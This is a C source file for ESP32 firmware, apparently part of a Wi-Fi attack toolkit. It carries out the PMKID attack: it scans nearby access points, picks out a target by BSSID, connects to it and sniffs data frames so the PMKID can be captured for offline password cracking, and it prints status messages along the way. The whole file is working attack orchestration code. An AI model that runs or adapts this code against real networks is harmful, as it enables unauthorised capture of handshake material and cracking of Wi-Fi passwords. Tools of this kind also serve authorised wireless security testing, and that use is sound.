/*
 * @file arma_pmkid.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for orchestrating the PMKID attack
 */

#include "arma_pmkid.h"

#include <stdio.h>
#include <string.h>

#include "arma_utils.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static TaskHandle_t pmkid_sniff_task_handle = NULL;
static uint8_t u_target_bssid[6];

void arma_pmkid_set_target(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }
  printf(
      "arma_pmkid.arma_pmkid_set_target > Target set AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
}

void pmkid_notif(void *args, esp_event_base_t event_base, int32_t event_id,
                 void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == PMKID_BASED) {
    arma_pmkid_finishing_sequence();
    uint8_t *b = u_target_bssid;
    printf("{PMKID,SUCCESS,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
           b[3], b[4], b[5]);
  }
}

void arma_pmkid_notif_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
                                             ATK_STATS_EVENT_ID, &pmkid_notif,
                                             NULL));
  printf(
      "arma_pmkid.arma_pmkid_notif_event_register > Registered pmkid_notif\n");
}

void arma_pmkid_notif_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &pmkid_notif));
  printf(
      "arma_pmkid.arma_pmkid_notif_event_unregister > Unregistered "
      "pmkid_notif\n");
}

void arma_delete_task_pmkid_sniff_duration() {
  if (pmkid_sniff_task_handle != NULL) {
    vTaskDelete(pmkid_sniff_task_handle);
    pmkid_sniff_task_handle = NULL;
    printf(
        "arma_pmkid.arma_delete_task_pmkid_sniff_duration > Task "
        "arma_pmkid_sniff_duration was deleted\n");
  }
}

void arma_pmkid_finishing_sequence() {
  printf("{PMKID,FINISHING_SEQUENCE,}\n");
  frame_parser_unregister_data_frame_handler();
  frame_parser_clear_target_parameter();
  arma_delete_task_pmkid_sniff_duration();
  arma_pmkid_notif_event_unregister();
  wifi_sniffer_stop();
  wifi_disconnect_from_ap(u_target_bssid);
}

void arma_pmkid_sniff_duration() {
  printf(
      "arma_pmkid.arma_pmkid_sniff_duration > Task arma_pmkid_sniff_duration "
      "was created\n");
  uint8_t *b = u_target_bssid;
  printf("{PMKID,SNIFF_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
         b[3], b[4], b[5]);
  int current_time = 0;

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    printf("{PMKID,SNIFF_STATUS,%d,}\n", current_time);
    current_time++;
  }
}

void arma_pmkid_launching_sequence(uint8_t *ssid_name, uint8_t ssid_len,
                                   uint8_t channel) {
  printf("{PMKID,LAUNCHING_SEQUENCE,}\n");
  frame_parser_set_target_parameter(u_target_bssid, PARSE_PMKID);
  frame_parser_register_data_frame_handler();
  arma_pmkid_notif_event_register();
  wifi_sniffer_start();
  wifi_set_filter(DATA);
  wifi_set_channel(channel);
  wifi_connect_to_ap(ssid_name, ssid_len, channel, u_target_bssid);
  xTaskCreatePinnedToCore(arma_pmkid_sniff_duration, TPS_NAME, TPS_STACK_SIZE,
                          NULL, TPS_PRIORITY, &pmkid_sniff_task_handle,
                          TPS_CORE_ID);
}

uint8_t calc_len_ssid_name(uint8_t *ssid_name) {
  uint8_t length = 0;
  for (uint8_t i = 0; i < 33; i++) {
    if (ssid_name[i] == 0) {
      break;
    } else {
      length++;
    }
  }
  if (length == 0) {
    printf("arma_pmkid.calc_len_ssid_name > Length of SSID: 0\n");
    return 0;
  }
  return length;
}

void arma_pmkid(char *target_bssid) {
  arma_pmkid_set_target(target_bssid);
  wifi_scan_aps();

  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint8_t total_scanned_aps = 0;

  // * Filter out the access point that has low RSSI
  for (uint8_t i = 0; i < ap_list->count; i++) {
    wifi_ap_record_t ap_record_scan = ap_records[i];
    if (ap_record_scan.rssi > -75) {
      total_scanned_aps++;
    }
  }

  printf("{PMKID,FOUND_APS,%u,}\n", total_scanned_aps);

  uint8_t found_target_ap = 0;
  uint8_t index_of_target_ap = 0;
  for (uint8_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    uint8_t *bssid = ap_record.bssid;

    vTaskDelay(100 / portTICK_PERIOD_MS);

    if (ap_record.rssi > -75) {
      printf("{PMKID,SCAN,%02X%02X%02X%02X%02X%02X,", bssid[0], bssid[1],
             bssid[2], bssid[3], bssid[4], bssid[5]);
      print_string_into_hex(ap_record.ssid);
      printf("%d,%u,}\n", ap_record.rssi, ap_record.primary);

      if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
        found_target_ap = 1;
        index_of_target_ap = i;
      }
    }
  }
  printf("{PMKID,FINISH_SCAN,}\n");

  if (found_target_ap == 1) {
    wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
    uint8_t ssid_len = calc_len_ssid_name(ap_record.ssid);
    uint8_t channel = ap_record.primary;

    printf("arma_pmkid.arma_pmkid > Target AP channel: %u\n", channel);
    arma_pmkid_launching_sequence(ap_record.ssid, ssid_len, channel);
  } else if (found_target_ap == 0) {
    uint8_t *b = u_target_bssid;
    printf("{PMKID,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
           b[3], b[4], b[5]);
  }
}